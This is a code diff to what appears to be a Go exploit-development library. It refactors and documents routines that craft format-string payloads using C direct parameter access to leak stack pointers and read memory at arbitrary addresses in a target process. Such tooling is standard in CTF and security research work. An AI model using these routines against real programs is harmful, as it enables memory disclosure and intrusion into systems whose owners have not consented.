@@ -9,37 +9,61 @@ import (
 	mathrand "math/rand"
 )
 
+// DPAFormatStringConfig is used to configure format string attacks that
+// specifically rely on the direct parameter access (DPA) feature found
+// in the format family of C functions.
 type DPAFormatStringConfig struct {
-	ProcessIOFn  func() ProcessIO
+	// ProcessIO is the process' ProcessIO used to interact
+	// with the underlying process.
+	ProcessIO ProcessIO
+
+	// MaxNumParams is the maximum number of direct parameter access
+	// argument numbers that will be accessed.
+	//
+	// This is required in order to guarantee that the resulting format
+	// string will be correctly padded to hold that upper limit of
+	// argument numbers without shifting the alignment of the string
+	// with the size of a pointer on the target system.
 	MaxNumParams int
-	PointerSize  int
-	Verbose      *log.Logger
+
+	// Verbose is an optional *log.Logger that can be used to
+	// obtain more information when interacting with a process
+	// while sending and receiving a format string.
+	Verbose *log.Logger
 }
 
 func (o DPAFormatStringConfig) validate() error {
-	if o.ProcessIOFn == nil {
-		return fmt.Errorf("get process function cannot be nil")
+	if o.ProcessIO == nil {
+		return fmt.Errorf("processio cannot be nil")
 	}
 
 	if o.MaxNumParams <= 0 {
 		return fmt.Errorf("maximum number of format function parameters must be greater than 0")
 	}
 
-	if o.PointerSize <= 0 {
+	if o.ProcessIO.PointerSizeBytes() <= 0 {
 		return fmt.Errorf("pointer size in bytes must be greater than 0")
 	}
 
 	return nil
 }
 
+// SetupFormatStringLeakViaDPAOrExit calls SetupFormatStringLeakViaDPA,
+// subsequently invoking DefaultExitFn if an error occurs.
+//
+// Refer to SetupFormatStringLeakViaDPA for more information.
 func SetupFormatStringLeakViaDPAOrExit(config DPAFormatStringConfig) *FormatStringLeaker {
 	f, err := SetupFormatStringLeakViaDPA(config)
 	if err != nil {
-		defaultExitFn(fmt.Errorf("failed to create format string param leaker - %w", err))
+		DefaultExitFn(fmt.Errorf("failed to create format string param leaker - %w", err))
 	}
 	return f
 }
 
+// SetupFormatStringLeakViaDPA sets up a new FormatStringLeaker by leaking
+// the direct parameter access (DPA) argument number of an oracle in a
+// specially-crafted format string. The oracle is replaced with the memory
+// address that callers wish to leak. This utilizes the '%s' format specifier.
 func SetupFormatStringLeakViaDPA(config DPAFormatStringConfig) (*FormatStringLeaker, error) {
 	setupConfig := dpaLeakSetupConfig{
 		dpaConfig: config,
@@ -51,7 +75,7 @@ func SetupFormatStringLeakViaDPA(config DPAFormatStringConfig) (*FormatStringLea
 			buff := bytes.NewBuffer(nil)
 			builder.appendDPALeak(config.MaxNumParams, []byte("p"), buff)
 
-			return builder, stringLenMemoryAligned(buff.Bytes(), config.PointerSize)
+			return builder, stringLenMemoryAligned(buff.Bytes(), config.ProcessIO.PointerSizeBytes())
 		},
 	}
 
@@ -61,31 +85,46 @@ func SetupFormatStringLeakViaDPA(config DPAFormatStringConfig) (*FormatStringLea
 	}
 
 	return &FormatStringLeaker{
-		procIOFn:  config.ProcessIOFn,
+		procIO:    config.ProcessIO,
 		builder:   dpaLeakConfig.builder,
 		formatStr: dpaLeakConfig.builder.buildDPA(dpaLeakConfig.paramNum, []byte("s"), dpaLeakConfig.alignLen),
 	}, nil
 }
 
+// dpaLeakSetupConfig configures a DPA format string leak.
 type dpaLeakSetupConfig struct {
-	dpaConfig                 DPAFormatStringConfig
+	// dpaConfig is the user-specified DPAFormatStringConfig.
+	dpaConfig DPAFormatStringConfig
+
+	// builderAndMemAlignedLenFn is a function that returns the
+	// formatStringBuilder that will be used to leak an oracle
+	// string. It also returns the length the string must be
+	// padded to in order to both fit user-specified arguments,
+	// and remain aligned with the target system's pointer size.
 	builderAndMemAlignedLenFn func() (formatStringBuilder, int)
 }
 
+// createDPAFormatStringLeakWithLastValueAsArg does the hard work involved
+// in identifying the location of a value within a format string using
+// the direct parameter access (DPA) feature. The returned *dpaLeakConfig
+// allows users to recreate the format string, which will be structured
+// such that the last value in the string is pointed to by the DPA number
+// saved in the object.
 func createDPAFormatStringLeakWithLastValueAsArg(config dpaLeakSetupConfig) (*dpaLeakConfig, error) {
 	err := config.dpaConfig.validate()
 	if err != nil {
 		return nil, err
 	}
 
-	oracle, err := randomStringOfCharsAndNums(config.dpaConfig.PointerSize)
+	pointerSizeBytes := config.dpaConfig.ProcessIO.PointerSizeBytes()
+	oracle, err := randomStringOfCharsAndNums(pointerSizeBytes)
 	if err != nil {
 		return nil, fmt.Errorf("failed to generate oracle string - %w", err)
 	}
 
-	invertedOracle := make([]byte, config.dpaConfig.PointerSize)
-	for i := 0; i < config.dpaConfig.PointerSize; i++ {
-		invertedOracle[i] = oracle[config.dpaConfig.PointerSize-i-1]
+	invertedOracle := make([]byte, pointerSizeBytes)
+	for i := 0; i < pointerSizeBytes; i++ {
+		invertedOracle[i] = oracle[pointerSizeBytes-i-1]
 	}
 
 	// TODO: Some platforms do not include '0x' in the format
@@ -107,7 +146,7 @@ func createDPAFormatStringLeakWithLastValueAsArg(config dpaLeakSetupConfig) (*dp
 		fmtStrBuilder.appendDPALeak(i, specifier, buff)
 
 		leakedValue, err := leakDataWithFormatString(
-			config.dpaConfig.ProcessIOFn(),
+			config.dpaConfig.ProcessIO,
 			append(fmtStrBuilder.build(memoryAlignedLen, buff), oracle...),
 			fmtStrBuilder)
 		if err != nil {
@@ -126,42 +165,67 @@ func createDPAFormatStringLeakWithLastValueAsArg(config dpaLeakSetupConfig) (*dp
 	return nil, fmt.Errorf("failed to find leak oracle after %d writes", i)
 }
 
+// dpaLeakConfig represents a successful leak of an oracle in a format string
+// using the direct parameter access feature.
 type dpaLeakConfig struct {
+	// paramNum is the DPA argument number at which the oracle
+	// was found.
 	paramNum int
+
+	// alignLen is the length that the string needs to be padded
+	// to in order to be consistently aligned with the size of
+	// a pointer on the target system.
 	alignLen int
-	builder  formatStringBuilder
+
+	// builder is the formatStringBuilder used to build the original
+	// oracle format string.
+	builder formatStringBuilder
 }
 
+// FormatStringLeaker abstracts leaking memory at a specified address using
+// a format string.
 type FormatStringLeaker struct {
 	formatStr []byte
 	builder   formatStringBuilder
-	procIOFn  func() ProcessIO
+	procIO    ProcessIO
 }
 
+// MemoryAtOrExit calls FormatStringLeaker.MemoryAt, subsequently calling
+// DefaultExitFn if an error occurs.
+//
+// Refer to FormatStringLeaker.MemoryAt for more information.
 func (o FormatStringLeaker) MemoryAtOrExit(pointer Pointer) []byte {
 	p, err := o.MemoryAt(pointer)
 	if err != nil {
-		defaultExitFn(fmt.Errorf("failed to read memory at 0x%x - %w", pointer.Bytes(), err))
+		DefaultExitFn(fmt.Errorf("failed to read memory at 0x%x - %w", pointer.Bytes(), err))
 	}
 	return p
 }
 
+// MemoryAt attempts to read the memory at the specified pointer.
 func (o FormatStringLeaker) MemoryAt(pointer Pointer) ([]byte, error) {
-	return leakDataWithFormatString(o.procIOFn(), o.FormatString(pointer), o.builder)
+	return leakDataWithFormatString(o.procIO, o.FormatString(pointer), o.builder)
 }
 
+// FormatString returns a new format string that can be used to leak
+// memory at the specified pointer.
 func (o FormatStringLeaker) FormatString(pointer Pointer) []byte {
 	return append(o.formatStr, pointer.Bytes()...)
 }
 
+// NewDPAFormatStringLeakerOrExit calls NewDPAFormatStringLeaker, subsequently
+// calling DefaultExitFn if an error occurs.
+//
+// Refer to NewDPAFormatStringLeaker for more information.
 func NewDPAFormatStringLeakerOrExit(config DPAFormatStringConfig) *DPAFormatStringLeaker {
 	res, err := NewDPAFormatStringLeaker(config)
 	if err != nil {
-		defaultExitFn(fmt.Errorf("failed to create new format string direct parameter access number leaker - %w", err))
+		DefaultExitFn(fmt.Errorf("failed to create new format string direct parameter access number leaker - %w", err))
 	}
 	return res
 }
 
+// NewDPAFormatStringLeaker returns a new instance of a *DPAFormatStringLeaker.
 func NewDPAFormatStringLeaker(config DPAFormatStringConfig) (*DPAFormatStringLeaker, error) {
 	err := config.validate()
 	if err != nil {
@@ -179,27 +243,50 @@ func NewDPAFormatStringLeaker(config DPAFormatStringConfig) (*DPAFormatStringLea
 	return &DPAFormatStringLeaker{
 		config:     config,
 		builder:    fmtStrBuilder,
-		alignedLen: stringLenMemoryAligned(unalignedBuff.Bytes(), config.PointerSize),
+		alignedLen: stringLenMemoryAligned(unalignedBuff.Bytes(), config.ProcessIO.PointerSizeBytes()),
 	}, nil
 }
 
+// DPAFormatStringLeaker leaks memory using direct access parameter (DPA)
+// argument numbers. It provides helper methods for identifying the
+// parameter number for a piece of data (such as a memory pointer).
 type DPAFormatStringLeaker struct {
-	config     DPAFormatStringConfig
-	builder    formatStringBuilder
+	// config is the user-specified DPAFormatStringConfig.
+	config DPAFormatStringConfig
+
+	// builder is the formatStringBuilder that will be used
+	// to construct new format strings.
+	builder formatStringBuilder
+
+	// alignedLen is the length that the format string must be
+	// padded to in order to fit the user's arguments while
+	// remaining aligned with the size of a pointer
+	// on the target system.
 	alignedLen int
 }
 
+// FindParamNumberOrExit calls DPAFormatStringLeaker.FindParamNumber,
+// subsequently calling DefaultExitFn if an error occurs.
+//
+// Refer to DPAFormatStringLeaker.FindParamNumber for more information.
 func (o DPAFormatStringLeaker) FindParamNumberOrExit(target []byte) (int, bool) {
 	i, b, err := o.FindParamNumber(target)
 	if err != nil {
-		defaultExitFn(err)
+		DefaultExitFn(err)
 	}
 	return i, b
 }
 
+// FindParamNumber finds the specified data by iterating through direct
+// parameter access argument numbers. If it finds the specified data,
+// it returns its corresponding parameter number and true. If the
+// target data could not be found, then it returns 0 and false.
+//
+// This is useful for finding the location of data (such as libc
+// symbols) that appear in the format function's stack frame.
 func (o DPAFormatStringLeaker) FindParamNumber(target []byte) (int, bool, error) {
 	for i := 0; i < o.config.MaxNumParams; i++ {
-		result, err := o.MemoryAtParam(i)
+		result, err := o.RawPointerAtParam(i)
 		if err != nil {
 			return 0, false, fmt.Errorf("failed to get memory at direct access param number %d - %w",
 				i, err)
@@ -220,15 +307,22 @@ func (o DPAFormatStringLeaker) FindParamNumber(target []byte) (int, bool, error)
 	return 0, false, nil
 }
 
-func (o DPAFormatStringLeaker) MemoryAtParamOrExit(paramNumber int) []byte {
-	res, err := o.MemoryAtParam(paramNumber)
+// RawPointerAtParamOrExit calls DPAFormatStringLeaker.RawPointerAtParam,
+// subsequently calling DefaultExitFn if an error occurs.
+//
+// Refer to DPAFormatStringLeaker.RawPointerAtParam for more information.
+func (o DPAFormatStringLeaker) RawPointerAtParamOrExit(paramNumber int) []byte {
+	res, err := o.RawPointerAtParam(paramNumber)
 	if err != nil {
-		defaultExitFn(fmt.Errorf("failed to get memory at param number %d - %w", paramNumber, err))
+		DefaultExitFn(fmt.Errorf("failed to get memory at param number %d - %w", paramNumber, err))
 	}
 	return res
 }
 
-func (o DPAFormatStringLeaker) MemoryAtParam(paramNumber int) ([]byte, error) {
+// RawPointerAtParam returns a pointer-size chunk of memory found at the
+// specified direct access parameter argument number using the '%p' format
+// specifier. The resulting byte sequence can be parsed using a PointerMaker.
+func (o DPAFormatStringLeaker) RawPointerAtParam(paramNumber int) ([]byte, error) {
 	if paramNumber > o.config.MaxNumParams {
 		// This is a problem because it may potentially shift
 		// the arguments on the stack, and make the result
@@ -237,38 +331,46 @@ func (o DPAFormatStringLeaker) MemoryAtParam(paramNumber int) ([]byte, error) {
 			paramNumber, o.config.MaxNumParams)
 	}
 
-	return leakDataWithFormatString(o.config.ProcessIOFn(), o.FormatString(paramNumber), o.builder)
+	return leakDataWithFormatString(o.config.ProcessIO, o.PointerFormatString(paramNumber), o.builder)
 }
 
-func (o DPAFormatStringLeaker) FormatString(paramNum int) []byte {
-	return o.builder.buildDPA(paramNum, []byte{'p'}, o.alignedLen)
+// PointerFormatString returns a new format string that can leak
+// a single pointer-sized chunk of memory at the specified direct
+// parameter access argument number.
+func (o DPAFormatStringLeaker) PointerFormatString(paramNumber int) []byte {
+	return o.builder.buildDPA(paramNumber, []byte{'p'}, o.alignedLen)
 }
 
+// leakDataWithFormatString attempts to leak memory using a format string
+// built with the specified formatStringBuilder. It extracts the data
+// returned by the call to the format string function by examining the
+// data between the resulting string's delimiters.
+//
 // TODO: Support for retrieving multiple values.
 //  E.g., |0x0000000000000001||0x0000000000000002|endstrdel
-func leakDataWithFormatString(process ProcessIO, formatStr []byte, info formatStringBuilder) ([]byte, error) {
-	err := info.isSuitableForLeaking()
+func leakDataWithFormatString(processIO ProcessIO, formatStr []byte, builder formatStringBuilder) ([]byte, error) {
+	err := builder.isSuitableForLeaking()
 	if err != nil {
 		return nil, fmt.Errorf("format string is not suitable for leaking data - %w", err)
 	}
 
-	err = process.WriteLine(formatStr)
+	err = processIO.WriteLine(formatStr)
 	if err != nil {
 		return nil, fmt.Errorf("failed to write format string to process - %w", err)
 	}
 
-	token, err := process.ReadUntil(info.endOfStringDelim)
+	token, err := processIO.ReadUntil(builder.endOfStringDelim)
 	if err != nil {
 		return nil, fmt.Errorf("failed to find end of string delim in process output - %w", err)
 	}
 
-	firstSepIndex := bytes.Index(token, info.returnDataDelim)
+	firstSepIndex := bytes.Index(token, builder.returnDataDelim)
 	if firstSepIndex == -1 {
 		return nil, fmt.Errorf("returned string does not contain first foramt string separator")
 	}
 
 	lineWithoutFirstSep := token[firstSepIndex+1:]
-	lastSepIndex := bytes.Index(lineWithoutFirstSep, info.returnDataDelim)
+	lastSepIndex := bytes.Index(lineWithoutFirstSep, builder.returnDataDelim)
 	if lastSepIndex == -1 {
 		return nil, fmt.Errorf("returned string does not contain second foramt string separator")
 	}
@@ -297,6 +399,8 @@ func stringLenMemoryAligned(stringWithoutPadding []byte, pointerSizeBytes int) i
 	return padLen + maxStringLen
 }
 
+// prependStringWithCharUntilLen prepends the specified string with a character
+// until it equals the specified length.
 func prependStringWithCharUntilLen(str []byte, c byte, newLen int) []byte {
 	strLen := len(str)
 	if strLen >= newLen {
@@ -306,6 +410,8 @@ func prependStringWithCharUntilLen(str []byte, c byte, newLen int) []byte {
 	return append(bytes.Repeat([]byte{c}, newLen-strLen), str...)
 }
 
+// appendStringWithCharUntilLen appends the specified string with a character
+// until it equals the specified length.
 func appendStringWithCharUntilLen(str []byte, c byte, newLen int) []byte {
 	strLen := len(str)
 	if strLen >= newLen {
@@ -315,6 +421,10 @@ func appendStringWithCharUntilLen(str []byte, c byte, newLen int) []byte {
 	return append(str, bytes.Repeat([]byte{c}, newLen-strLen)...)
 }
 
+// randomStringOfCharsAndNums returns a new string of human-readable characters
+// equal to the specified length.
+//
+// The random seed is generated using crypto/rand.Read.
 func randomStringOfCharsAndNums(numChars int) ([]byte, error) {
 	if numChars <= 0 {
 		return nil, fmt.Errorf("number of random characters cannot be less than or equal to zero")
@@ -325,7 +435,7 @@ func randomStringOfCharsAndNums(numChars int) ([]byte, error) {
 	rawRandom := make([]byte, 8)
 	_, err := rand.Read(rawRandom)
 	if err != nil {
-		return nil, err
+		return nil, fmt.Errorf("crypt/rand.Read() failed - %w", err)
 	}
 
 	src := mathrand.NewSource(int64(binary.BigEndian.Uint64(rawRandom)))
